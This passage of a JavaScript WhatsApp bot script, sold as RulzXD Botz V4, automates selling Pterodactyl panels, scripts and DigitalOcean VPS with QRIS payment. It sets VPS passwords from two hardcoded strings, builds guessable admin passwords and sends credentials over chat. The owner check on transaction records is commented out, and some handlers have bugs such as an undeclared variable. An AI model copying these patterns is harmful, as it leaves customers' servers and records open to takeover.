🔥 *Hosting Cerdas Untuk Bisnis Cemerlang!*

━━━━━━━━━━━ ✦ 🔥 ✦ ━━━━━━━━━━━  

💰 *LAYANAN OPEN 24 JAM NON STOP!*  

📌 *Lihat Semua Kebutuhan Anda di Sini:*
🔗 https://wa.me/62882007580714?text=.buymenu

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

*💡 Kenapa Harus RulzXD Botz V4?*
✅ Auto Buy 24/7 – Pembelian otomatis tanpa delay
✅ Fast Response – Balas pesan dalam hitungan detik
✅ Multi-Function – Bisa digunakan untuk jualan, informasi, & lainnya
✅ Auto Backup Data – Data aman dengan sistem backup setiap 6 jam
✅ Customizable – Bisa disesuaikan dengan kebutuhan bisnis
✅ Mudah Digunakan – Tinggal install dan langsung jalan
✅ Free Update - Gratis update script sampai versi akhir
✅ Fitur Lengkap - Script ini adalah gabungan dari MD & Store

*🔥 Informasi script!*
✨ Custom UI & UX – Tampilan bot yang lebih profesional
✨ Sistem Keamanan Ganda – Menggunakan password & database nomor
✨ Support Order Kuota – Terhubung dengan metode pembayaran order kuota
✨ Support Button – Button bisa digunakan di semua jenis whatsapp
✨ 2 Metode Pembayaran - Tersedia pembayaran qris all payment dan saldo user di database bot

*💰 Harga Script: Hanya 50K!*
*🔹 Keuntungan Membeli RulzXD Botz V4:*
✔ Buy otomatis integrasi order kuota
✔ Mudah digunakan & dipasang
✔ Dapat digunakan untuk berbagai bisnis digital
✔ Bisa di-custom sesuai kebutuhan
✔ Support dan update berkala
✔ Keamanan pertama dengan sistem password – Pengguna harus mengisi password terlebih dahulu untuk memastikan hanya orang tertentu yang bisa mengaksesnya!
✔ Keamanan kedua dengan sistem database -- Setelah memasukkan password, pengguna diminta memasukann nomor whatsapp, jika nomor tersebut tidak ada di database maka bot akan berhenti secara otomatis!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

*🌐 Website Resmi:*
🔹 www.rulzzofficial.my.id – Website Utama
🔹 payment.rulzzofficial.my.id – Sistem Pembayaran
🔹 api.rulzzofficial.my.id – REST API untuk Developer
🔹 produk.rulzzofficial.my.id – Daftar Produk & Layanan

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

*📞 Hubungi Kami Sekarang!*
📌 Owner: 6285133225752
🎥 YouTube: @bangrulzz44
📸 Instagram: @rulzzstore2024
💬 Telegram: @rulzzofficial

🔥 Jangan ketinggalan! Dapatkan RulzXD Botz V4 sekarang dan nikmati bisnis otomatis dengan fitur lengkap dan keamanan ekstra! 🚀`;
await Rulzz.sendMessage(m.chat, {
  text: teks.trim(),
  footer: `RulzXD Botz V4 - 2025`,
  headerType: 1,
  viewOnce: true,
  buttons: [
    {
      buttonId: `.buysc`,
      buttonText: { displayText: 'Beli Script' },
      type: 1
    },
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Hubungi Owner' },
      type: 1
    }
  ],
  contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
    }
})
}
break

//================================================================================

case "report": case "reporteror": {
 const args = text.slice(0).trim();
  if (!args || !args.includes('|')) {
  m.reply('⚠️ *Format salah!*\n\n' + 'Gunakan format:\n.report <masalah>|<alasan>\n\n' + 'Contoh:\n.report Bug fitur login|Tidak bisa input email'
     );
  }

  const splitIndex = args.indexOf('|');
  const masalah = args.slice(0, splitIndex).trim();
  const alasan = args.slice(splitIndex + 1).trim();

  if (!masalah || !alasan) {
    m.reply('⚠️ *Masalah dan alasan tidak boleh kosong!*\n\n' + 'Gunakan format:\n.report <masalah>|<alasan>\n\n' + 'Contoh:\n.report Bug fitur login|Tidak bisa input email'
    );
  }
    
  const reportFilePath = "./library/database/reports.json"
  const ownerNumber = global.owner;
  const reportID = `@${m.sender.split("@")[0]}`;
  const waktuLaporan = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
  const numId = m.sender
  const statusReport = "Belum selesai"

  let reports = [];
   if (fs.existsSync(reportFilePath)) {
     try {
       reports = JSON.parse(fs.readFileSync(reportFilePath, 'utf8'));
     } catch (err) {
       console.error('Gagal membaca file reports.json:', err);
      }
   }

   const newReport = {
      id: reportID,
      reporterId: numId,
      masalah,
      alasan,
      waktu: waktuLaporan,
      status: statusReport,
   };
   reports.push(newReport);

   try {
      fs.writeFileSync(reportFilePath, JSON.stringify(reports, null, 2), 'utf8');
   } catch (err) {
      console.error('Gagal menyimpan laporan ke reports.json:', err);
      m.reply('❌ *Gagal menyimpan laporan!*\nCoba lagi nanti.');
   }

   m.reply(
      `✅ *Laporan Berhasil Dikirim Ke Developer Bot!*\n\n` +
      `📄 *Detail Laporan:*\n` +
      `🆔 ID Laporan: *${reportID}*\n` +
      `📌 Masalah: *${masalah}*\n` +
      `📋 Alasan: *${alasan}*\n` +
      `📅 Waktu: *${waktuLaporan}*\n` +
      `📝 Status: *${statusReport}*\n\n` +
      `Terima kasih atas laporanmu! Developer kami akan segera menindaklanjutinya.`
   );

   await Rulzz.sendMessage(
     ownerNumber + '@s.whatsapp.net', { text:
     `📣 *Laporan Fitur Eror Baru Diterima!*\n\n` +
      `📄 *Detail Laporan:*\n` +
      `🆔 ID Laporan: *${reportID}*\n` +
      `📌 Masalah: *${masalah}*\n` +
      `📋 Alasan: *${alasan}*\n` +
      `📅 Waktu: *${waktuLaporan}*\n` +
      `📝 Status; *${statusReport}*\n\n` + 
      `⚡ _Segera periksa laporan ini untuk tindakan lebih lanjut._`
     });
   }
break

//================================================================================

case "cadmin": {
if (!isOwner) return m.reply(mess.owner)
if (!text) return m.reply(`*Contoh Command :*

*.cadmin* username
*.cadmin* username,628xxxx`)
let nomor
let usernem
let tek = text.split(",")
if (tek.length > 1) {
let [users, nom] = text.split(",")
if (!users || !nom) return m.reply(`*Contoh Command :*

*.cadmin* username
*.cadmin* username,628xxxx`)
nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
usernem = users.toLowerCase()
} else {
usernem = text.toLowerCase()
nomor = m.chat
}
var onWa = await Rulzz.onWhatsApp(nomor.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp!")
let username = usernem.toLowerCase()
let email = username+"@bot-rulzzofficial.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.chat !== nomor) {
orang = nomor
await m.reply(`Data admin panelnya udah dikirim ke nomor ${nomor.split("@")[0]}`)
} else {
orang = m.chat
}
var teks = `
*Berikut Detail Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
*🗓️ ${tanggal(Date.now())}*

*🌐* ${global.domain}

*Rules Admin Panel :*
* Simpan data ini sebaik mungkin admin tidak mengirim 2x
* Jangan hapus server orang lain
* Jangan masuk server orang lain
* Ketahuan maling sc, auto delete akun no reff!
* Jangan rusuh
*Dll Cek Deskripsi Grub*
`
await Rulzz.sendMessage(orang, {text: teks}, {quoted: qtext})
}
break

//================================================================================

case "cadmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Rulzz.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//================================================================================

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//================================================================================

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//================================================================================

case "addseller": case "addprem": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi premium!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah premium ✅`)
}
break

//================================================================================

case "listseller": case "listprem": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Rulzz.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//================================================================================

case "delseller": case "delprem": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan premium!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus premium ✅`)
}
break

case "addpremall": case "addsellerall": {
    if (!m.isGroup) return m.reply(mess.group);
    if (!isCreator) return m.reply(mess.owner);
    
    const groupMetadata = await Rulzz.groupMetadata(from);
    let added = 0;
    for (let user of groupMetadata.participants) {
        if (!premium.includes(user.id)) {
            premium.push(user.id);
            added++;
        }
    }
    await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2));
    m.reply(`Sukses menambahkan ${added} member ke daftar premium ✅`);
}
break

case "delpremall": {
    if (!m.isGroup) return m.reply(mesa.group);
    if (!isCreator) return m.reply(mess.owner);
    
   const groupMetadata = await Rulzz.groupMetadata(from);
    let added = 0;
    for (let user of groupMetadata.participants) {
        if (premium.includes(user.id)) {
            premium = premium.filter(v => v !== user.id);
            removed++;
        }
    }
    await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2));
    m.reply(`Sukses menghapus ${removed} member dari daftar premium ✅`);
}
break

//================================================================================

case "addsellerprivate": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || sellerprivate.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller panel private!`)
sellerprivate.push(input)
await fs.writeFileSync("./library/database/sellerprivate.json", JSON.stringify(sellerprivate, null, 2))
m.reply(`Berhasil menambah reseller panel private ✅`)
}
break

//================================================================================

case "listsellerprivate": {
if (sellerprivate.length < 1) return m.reply("Tidak ada user reseller panel private")
let teks = `\n *乂 List all reseller panel private*\n`
for (let i of sellerprivate) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Rulzz.sendMessage(m.chat, {text: teks, mentions: sellerprivate}, {quoted: m})
}
break

//================================================================================

case "delsellerprivate": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!sellerprivate.includes(input)) return m.reply(`Nomor ${input2} bukan reseller private!`)
let posi = sellerprivate.indexOf(input)
await sellerprivate.splice(posi, 1)
await fs.writeFileSync("./library/database/sellerprivate.json", JSON.stringify(sellerprivate, null, 2))
m.reply(`Berhasil menghapus reseller panel private✅`)
}
break

//================================================================================

case "buyscript": case "buysc": {
if (script.length < 1) return m.reply("Maaf Script Bot sedang tidak tersedia.");
if (m.isGroup) return m.reply("Pembelian script bot hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

  if (!text) {
    let butnya = []
    let urutt = 0
    for (let gg of script) {
    butnya.push({
    title: `${gg.nama} ✅`, 
    description: `Rp${await toIDR(gg.harga)}`, 
    id: `.buyscript ${urutt += 1}`
    })
    }
    return Rulzz.sendMessage(
      m.chat,
      {
        buttons: [
          {
            buttonId: "action",
            buttonText: { displayText: "ini pesan interactiveMeta" },
            type: 4,
            nativeFlowInfo: {
              name: "single_select",
              paramsJson: JSON.stringify({
                title: "Pilih Script",
                sections: [
                  {
                    rows: butnya, 
                    }
                 ], 
              }),
            },
          },
        ],
        headerType: 1,
        viewOnce: true,
        text: "\n*Pilih Script Yang Ingin Kamu Beli*\n",
        contextInfo: {
          isForwarded: true, 
          mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
        },
      },
      { quoted: null }
    );
  }
  
 const scnya = script[Number(text) - 1]
 let Obj = {}
 Obj.harga = scnya.harga;
 Obj.namasc = scnya.nama;
 Obj.path = scnya.path;
 
 const owner = global.owner + "@s.whatsapp.net";
 const saldoUser = db.users[m.sender].saldo || 0;
 const saldoSebelum = saldoUser;
 const saldoSesudah = saldoUser - Obj.harga;
 
 if (saldoUser >= Obj.harga) {
    db.users[m.sender].saldo -= Obj.harga;

    await m.reply(`✅ *Pembelian Script Bot Berhasil!*

*🆔 Nama Script :* ${Obj.namasc}
*💵 Harga :* Rp${await toIDR(Obj.harga)}
*💳 Saldo Sebelumnya :* Rp${await toIDR(saldoSebelum)}
*💳 Saldo Sekarang :* Rp${await toIDR(saldoSesudah)}
*🏧 Metode Pembayaran :* Saldo

*_⌛ Sedang memproses script bot kamu..._*`);
  await Rulzz.sendMessage(m.chat, {
  document: await fs.readFileSync(Obj.path),
  mimetype: "application/zip",
  fileName: Obj.namasc + ".zip",
  caption: "*⚠️ Script hanya dikirim satu kali! Simpan baik-baik, tidak ada garansi untuk mengirim script lagi.*",
  contextInfo: { isForwarded: true }
});

    await Rulzz.sendMessage(owner, {
      text: `📢 SCRIPT BOT SOLDOUT ❗
─────────────────────────────────────
👤 Pembeli : @${m.sender.split("@")[0]}
🆔 Nama Script : ${Obj.namasc}
💸 Harga : Rp${await toIDR(Obj.harga)}
🏧 Pembayaran : Saldo
📦 Status : ✅ Berhasil`,
      mentions: [m.sender],
    });
  } else {
    m.reply(`❌ Saldo kamu tidak cukup!\n💰 Harga: Rp${await toIDR(Obj.harga)}\n💳 Saldo saat ini: Rp${await toIDR(saldoUser)}`);
  }
}
break

//================================================================================

case "buyvps": {
  if (m.isGroup) return m.reply("❌ Pembelian VPS hanya bisa dilakukan di private chat.");
  if (db.users[m.sender].status_deposit) return m.reply("⚠️ Masih ada transaksi yang belum diselesaikan!\n\nKetik *.batalbeli* untuk membatalkan transaksi sebelumnya.");

  let kode = null;
  let subdo = null;
  let sett = global.vps; // taruh di atas biar bisa dipakai di semua bagian

  if (args[0]?.includes('|')) {
    [kode, subdo] = args[0].split('|');
  } else {
    subdo = args[0];
  }

  if (!kode) {
    if (!/^[a-zA-Z]{1,12}$/.test(subdo)) return m.reply(example("<subdomain> (hanya huruf, max 12)"));

    return Rulzz.sendMessage(m.chat, {
      text: "Pilih Ram Server VPS Yang Tersedia",
      footer: `© RulzXD Botz V4`,
      headerType: 1,
      viewOnce: true,
      contextInfo: {
        isForwarded: true,
        mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
      },
      buttons: [
        {
          buttonId: 'action',
          buttonText: { displayText: 'List Paket VPS' },
          type: 4,
          nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
              title: 'Pilih Spesifikasi VPS',
              sections: [
                {
                  title: 'List Ram Server VPS',
                  highlight_label: 'Recommended',
                  rows: [
                    {
                      title: 'Ram 16GB & CPU 4',
                      description: await toIDR(sett["16g4"]),
                      id: `.buyvps 5|${subdo}`
                    },
                    {
                      title: 'Ram 1GB & CPU 1',
                      description: await toIDR(sett["1g1"]),
                      id: `.buyvps 1|${subdo}`
                    },
                    {
                      title: 'Ram 2GB & CPU 1',
                      description: await toIDR(sett["2g1"]),
                      id: `.buyvps 2|${subdo}`
                    },
                    {
                      title: 'Ram 4GB & CPU 2',
                      description: await toIDR(sett["4g2"]),
                      id: `.buyvps 3|${subdo}`
                    },
                    {
                      title: 'Ram 8GB & CPU 4',
                      description: await toIDR(sett["8g4"]),
                      id: `.buyvps 4|${subdo}`
                    }
                  ]
                }
              ]
            })
          }
        }
      ]
    }, { quoted: qtoko });
  }

  if (!/^[a-zA-Z]{1,12}$/.test(subdo)) return m.reply("❌ Subdomain hanya boleh huruf dan maksimal 12 karakter.");

  // Mapping paket VPS dari sett
  const paketVps = {
    "1": {
      nama: "Ram 1GB 1Core",
      images: "s-1vcpu-1gb",
      harga: sett["1g1"]
    },
    "2": {
      nama: "Ram 2GB 1Core",
      images: "s-1vcpu-2gb",
      harga: sett["2g1"]
    },
    "3": {
      nama: "Ram 4GB 2Core",
      images: "s-2vcpu-4gb",
      harga: sett["4g2"]
    },
    "4": {
      nama: "Ram 8GB 4Core",
      images: "s-4vcpu-8gb",
      harga: sett["8g4"]
    },
    "5": {
      nama: "Ram 16GB 4Core",
      images: "s-4vcpu-16gb",
      harga: sett["16g4"]
    }
  };
  

  const Obj = paketVps[kode];
  if (!Obj) return m.reply("❌ Pilihan tidak valid.");

  const fullSubdo = subdo.toLowerCase();
  const pilihanIndex = [4, 5, 6];
  const tld = Object.keys(global.subdomain)[pilihanIndex[Math.floor(Math.random() * pilihanIndex.length)]];
  const domainPanel = `${fullSubdo}.${tld}`;
  const domainNode = `node.${fullSubdo}.${tld}`;
  const owner = global.owner + '@s.whatsapp.net';

  const nominal = Number(Obj.harga);
  const unik = generateRandomNumber(200, 350);
  const total = nominal + unik;

  // Setting password vps (acak)
  const possiblePasswords = ["VpsRulzzFr3sh", "VpsFr3shRulzz"];
  Obj.password = possiblePasswords[Math.floor(Math.random() * possiblePasswords.length)];

  const res = await axios.get(`https://api.rulzzofficial.my.id/orkut/createpayment?apikey=${global.apikey}&amount=${total}&codeqr=${global.kodeqr}`);
  const { imageqris, jumlah, idtransaksi } = res.data.result;
  const jumlahInt = parseInt(jumlah);
  const expireAt = Date.now() + 5 * 60 * 1000;

  const teks = `
*乂 DETAIL PEMBAYARAN*
*• Id Trx :* ${idtransaksi}
*• Nominal :* Rp${nominal}
*• Fee :* Rp${unik}
*• Total :* Rp${await toIDR(jumlah)}
*• Status :* Menunggu Pembayaran
*• Expired :* 5 Menit

*乂 DETAIL PEMBELIAN*
*• Barang :* VPS ${Obj.nama}
*• Subdomain :* ${domainPanel}
*• Node :* ${domainNode}
*• Berlaku Selama:* 30 Hari
*• Garansi Selama:* 14 Hari
*• Auto Install:* Yes ✅`;

  const msgQr = await Rulzz.sendMessage(m.chat, {
    image: { url: imageqris.url },
    caption: teks,
    buttons: [
      { buttonId: `.batalbeli`, buttonText: { displayText: "Batalkan Pembelian" }, type: 1 },
      { buttonId: `.reffund`, buttonText: { displayText: "Laporan Pembelian" }, type: 1 }
    ],
    headerType: 1,
    viewOnce: true,
    contextInfo: {
      mentionedJid: [m.sender],
      isForwarded: true
    }
  });

  db.users[m.sender].status_deposit = true;
  db.users[m.sender].saweria = {
    msg: msgQr,
    chat: m.sender,
    idDeposit: idtransaksi,
    amount: jumlahInt,
    status: true,
    expireAt
  };

  
  setTimeout(async () => {
    if (db.users[m.sender]?.saweria?.status && Date.now() >= db.users[m.sender].saweria.expireAt) {
      await Rulzz.sendMessage(m.chat, { text: "❌ Waktu pembayaran sudah habis." }, { quoted: msgQr });
      await Rulzz.sendMessage(m.chat, { delete: msgQr.key });
      db.users[m.sender].status_deposit = false;
      db.users[m.sender].saweria.status = false;
      delete db.users[m.sender].saweria;
    }
  }, 5 * 60 * 1000);

  
  let retries = 0;
  const maxRetries = 60;
  while (db.users[m.sender]?.saweria?.status && Date.now() < expireAt && retries < maxRetries) {
    retries++;
    await sleep(5000);
    try {
      const mutasi = (await axios.get(`https://api.rulzzofficial.my.id/orkut/cekstatus?apikey=${global.apikey}&username=${global.username}&token=${global.tokenorkut}`)).data.result || [];
      const cocok = mutasi.slice(0, 5).find(x => parseInt(x.kredit) === jumlahInt);
      if (!cocok) continue;

      db.users[m.sender].status_deposit = false;
      await Rulzz.sendMessage(m.sender, {
        text: `*PEMBAYARAN BERHASIL ✅*\n\n*• Id Trx :* ${idtransaksi}\n*• Total :* Rp${await toIDR(total)}\n*• Barang :* VPS 1 Bulan\n\n*🛠️ Memproses pembuatan VPS...*`
      }, { quoted: db.users[m.sender].saweria.msg });

      // Buat droplet DigitalOcean
     const dropletData = {
        name: `${subdo}-${m.sender.split("@")[0]}`,
        region: "sgp1",
        size: Obj.images,
        image: 'ubuntu-20-04-x64',
        ssh_keys: null,
        backups: false,
        ipv6: true,
        user_data: null,
        private_networking: null,
        volumes: null,
        tags: ['T']
      };

      const response = await fetch('https://api.digitalocean.com/v2/droplets', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${global.apiDigitalOcean}`
        },
        body: JSON.stringify(dropletData)
      });

      const resJson = await response.json();
      if (!response.ok) return m.reply(`❌ Gagal membuat VPS: ${resJson.message}`);
      const dropletId = resJson.droplet.id;

      await sleep(60000);
      const detail = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${global.apiDigitalOcean}`
        }
      });

      const detailJson = await detail.json();
      const ipVps = detailJson.droplet.networks.v4[0].ip_address;

      await Rulzz.sendMessage(m.sender, {
        text: `✅ *VPS Berhasil Dibuat!*\n\n*• Id Trx :* ${dropletId}\n*• IP:* ${ipVps}\n*• Password:* ${Obj.password}`
      });

      const hasilSub = await subDomainDouble(fullSubdo, ipVps, tld);
      if (!hasilSub.success) return m.reply(`❌ Gagal membuat subdomain: ${hasilSub.error}`);

      const listSub = hasilSub.data.map((item, i) => `• ${i + 1}. ${item.name} → ${item.ip}`).join("\n");
      await m.reply(`*🌐 Subdomain berhasil dibuat ✅*\n\n${listSub}`);

      await installPanel(ipVps, Obj.password, domainPanel, domainNode, 16000000, m.chat, m);
      
      addTransaction(m.sender, 'Buy Vps', Obj.harga);
      await Rulzz.sendMessage(owner, {
        text: `📢 VPS SOLD ❗\n\n🆔 @${m.sender.split("@")[0]}\n📦 ${Obj.sizeOption} - ${Obj.osOption} - ${Obj.regionOption}\n💸 Rp${await toIDR(Obj.harga)}\n✅ STATUS: Berhasil`,
        mentions: [m.sender]
      });

      await Rulzz.sendMessage(m.sender, { delete: db.users[m.sender].saweria.msg.key });
      delete db.users[m.sender].saweria;
    } catch (err) {
      console.error(err);
      m.reply(`Terjadi kesalahan saat membuat VPS: ${err}\n\nSilahkan gunakan fitur *.reffund* untuk ajukan reffund.`);
    }
  }
}
break

case "rekaptransaksi": {
    // if (!isCreator) return m.reply(mess.owner);
    
    const oneWeekAgo = Date.now() - (7 * 24 * 60 * 60 * 1000);
    const sql = `
        SELECT user_id, type, amount, date 
        FROM transactions
        WHERE date >= ?
        ORDER BY date ASC
    `;

    rekap.all(sql, [oneWeekAgo], (err, rows) => {
        if (err) return m.reply('Gagal mengambil data transaksi.');

        if (!rows.length) return m.reply('Tidak ada transaksi dalam 7 hari terakhir.');

        let teks = `📊 Rekap transaksi 7 hari terakhir:\n\n`;
        let total = 0;

        rows.forEach((r, i) => {
            const tgl = new Date(r.date).toLocaleString('id-ID', {
                timeZone: 'Asia/Jakarta',
                day: '2-digit',
                month: '2-digit',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit'
            });

            teks += `#${i + 1}\n`;
            teks += `👤 : ${r.user_id}\n`;
            teks += `📦 : ${r.type}\n`;
            teks += `💵 : Rp${r.amount.toLocaleString('id-ID')}\n`;
            teks += `📆 : ${tgl} WIB\n`;
            teks += `━━━━━━━━━━━━━━━━━━━━\n\n`;

            total += r.amount;
        });

        teks += `📌 Total transaksi: ${rows.length}\n`;
        teks += `📌 Total nominal: Rp${total.toLocaleString('id-ID')}`;

        m.reply(teks);
    });
}
break

//================================================================================ 

case "buyresellerpublic": case "buyresellerpp": case "buyresellerpanel": {
if (m.isGroup) return m.reply("Pembelian reseller panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

 const harga = global.hargaresspublic
 const owner = global.owner + "@s.whatsapp.net";
 const saldoUser = db.users[m.sender].saldo || 0;
 const saldoSebelum = saldoUser;
 const saldoSesudah = saldoUser - harga;
 
 if (saldoUser >= harga) {
    db.users[m.sender].saldo -= harga;

    await m.reply(`✅ *Pembelian Reseller Panel Berhasil!*

*🆔 Nama Barang :* Reseller Panel Public
*💵 Harga :* Rp${await toIDR(harga)}
*🌐 Link :* ${global.linkresellerpublic}
*💳 Saldo Sebelumnya :* Rp${await toIDR(saldoSebelum)}
*💳 Saldo Sekarang :* Rp${await toIDR(saldoSesudah)}
*🏧 Metode Pembayaran :* Saldo

> Tunggu sampai di acc, jika dalam waktu 3 jam lebih belum di acc Silakan telpon admin

*Rules Reseller Panel ⚠️*
* Jangan Bagi² Panel Free
* Bikin Panel Harus Di Pakai
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Jangan Sebar Link Login

> Rules Lengkap Ada Di Grub`);
   addTransaction(m.sender, 'Buy Reseller Panel Public', harga);
   await Rulzz.sendMessage(owner, {
      text: `📢 RESELLER PANEL PUBLIC SOLDOUT ❗
─────────────────────────────────────
*🆔 Nama Barang :* Reseller Panel Public
*💵 Harga :* Rp${await toIDR(harga)}
*💳 Saldo Sebelumnya :* Rp${await toIDR(saldoSebelum)}
*💳 Saldo Sekarang :* Rp${await toIDR(saldoSesudah)}
*🏧 Metode Pembayaran :* Saldo
📦 Status : ✅ Berhasil`,
      mentions: [m.sender],
    });
  } else {
    m.reply(`❌ Saldo kamu tidak cukup!\n💰 Harga: Rp${await toIDR(harga)}\n💳 Saldo saat ini: Rp${await toIDR(saldoUser)}`);
  }
}
break

//================================================================================

case "buyresellerprivate": case "buyrpp": case "buyresellerpanelprivate": {
if (m.isGroup) return m.reply("Pembelian reseller panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

 const harga = global.hargaressprivate
 const owner = global.owner + "@s.whatsapp.net";
 const saldoUser = db.users[m.sender].saldo || 0;
 const saldoSebelum = saldoUser;
 const saldoSesudah = saldoUser - harga;
 
 if (saldoUser >= harga) {
    db.users[m.sender].saldo -= harga;

    await m.reply(`✅ *Pembelian Reseller Panel Private Berhasil!*

*🆔 Nama Barang :* Reseller Panel Private
*💵 Harga :* Rp${await toIDR(harga)}
*🌐 Link :* ${global.linkresellerprivate}
*💳 Saldo Sebelumnya :* Rp${await toIDR(saldoSebelum)}
*💳 Saldo Sekarang :* Rp${await toIDR(saldoSesudah)}
*🏧 Metode Pembayaran :* Saldo

> Tunggu sampai di acc, jika dalam waktu 3 jam lebih belum di acc Silakan telpon admin

*Rules Reseller Panel ⚠️*
